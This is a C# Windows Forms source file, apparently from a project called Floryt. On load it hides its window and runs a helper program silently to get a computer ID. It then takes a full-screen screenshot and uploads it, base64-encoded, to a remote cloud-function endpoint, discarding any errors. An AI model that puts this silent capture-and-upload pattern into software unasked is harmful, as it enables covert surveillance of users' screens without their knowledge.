using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace http_windows_forms
{
    public partial class Form1 : Form
    {
        public void uploadScreenshot()
        {
            //---get uid
            //Create process
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();

            //strCommand is path and file name of command to run
            pProcess.StartInfo.FileName = "find_id.exe";

            //strCommandParameters are parameters to pass to program
            pProcess.StartInfo.Arguments = null;

            pProcess.StartInfo.UseShellExecute = false;

            //Set output of program to be written to process output stream
            pProcess.StartInfo.RedirectStandardOutput = true;

            pProcess.StartInfo.CreateNoWindow = true;

            //Start the process
            pProcess.Start();

            //Get program output
            string strUID = pProcess.StandardOutput.ReadToEnd();

            strUID = strUID.Remove(strUID.Length - 2);
            //Console.WriteLine(strUID);
            //Wait for process to finish
            pProcess.WaitForExit();

            //string strUID = "123";

            //---http
            // Create a request using a URL that can receive a post. 
            WebRequest request = WebRequest.Create("https://us-central1-floryt-88029.cloudfunctions.net/upload_screenshot");
            // Set the Method property of the request to POST.
            request.Method = "POST";


            // Create POST data and convert it to a byte array.
            string picData = ReadImageFile(CreateScreenshot());
            string postData = "{\"computerUid\":\"" + strUID + "\", \"image\":\"" + picData + "\"}";
            //Console.WriteLine(postData);
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);



            // Set the ContentType property of the WebRequest.
            request.ContentType = "application/json";
            // Set the ContentLength property of the WebRequest.
            request.ContentLength = byteArray.Length;
            // Get the request stream.
            Stream dataStream = request.GetRequestStream();
            // Write the data to the request stream.
            dataStream.Write(byteArray, 0, byteArray.Length);
            // Close the Stream object.
            dataStream.Close();
            // Get the response.
            try
            {
                WebResponse response = request.GetResponse();
            }
            catch (Exception ex)
            {

            }

        }

        public string CreateScreenshot()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            // Save the screenshot to the specified path that the user has chosen.
            Guid g = Guid.NewGuid();
            string p_path = @"C:\Users\User\Floryt\" + g.ToString() + ".png";
            //@"C:\Program Files\Floryt\" + 
            bmpScreenshot.Save(p_path, ImageFormat.Png);
            label1.Text = "saved image";
            return p_path;
        }

        public static string ReadImageFile(string imageLocation)
        {
            byte[] imageData = null;
            FileInfo fileInfo = new FileInfo(imageLocation);
            long imageFileLength = fileInfo.Length;
            FileStream fs = new FileStream(imageLocation, FileMode.Open, FileAccess.Read);
            BinaryReader br = new BinaryReader(fs);
            imageData = br.ReadBytes((int)imageFileLength);
            //fileInfo.Delete();
            return Convert.ToBase64String(imageData);
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            uploadScreenshot();

            this.Close();

        }
    }
}
